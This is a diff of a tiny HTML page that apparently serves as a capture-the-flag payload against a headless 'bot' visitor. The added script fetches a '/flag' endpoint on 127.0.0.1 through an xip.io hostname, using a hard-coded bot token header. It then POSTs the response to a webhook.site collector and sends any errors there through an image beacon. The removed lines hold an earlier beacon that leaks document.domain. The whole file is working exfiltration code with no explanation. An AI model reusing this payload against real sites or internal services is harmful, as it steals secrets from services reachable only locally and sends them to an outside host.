@@ -1,13 +1,31 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>test</title>
-</head>
 <body>
 <script>
-new Image().src='https://webhook.site/d0e67d04-c4e8-4082-8bc6-de3ae5db48fa?msg=js_ok&d='+encodeURIComponent(document.domain);
+(async () => {
+  try {
+    const r = await fetch("http://127.0.0.1.xip.io:30022/flag", {
+      headers: {
+        "X-bot-token": "s3cr3t_b0t_t0k3n_2026"
+      }
+    });
+    const t = await r.text();
+
+    await fetch("https://webhook.site/d0e67d04-c4e8-4082-8bc6-de3ae5db48fa", {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify({
+        status: r.status,
+        body: t
+      })
+    });
+  } catch (e) {
+    new Image().src =
+      "https://webhook.site/d0e67d04-c4e8-4082-8bc6-de3ae5db48fa?err=" +
+      encodeURIComponent(String(e));
+  }
+})();
 </script>
-hello
+ok
 </body>
 </html>
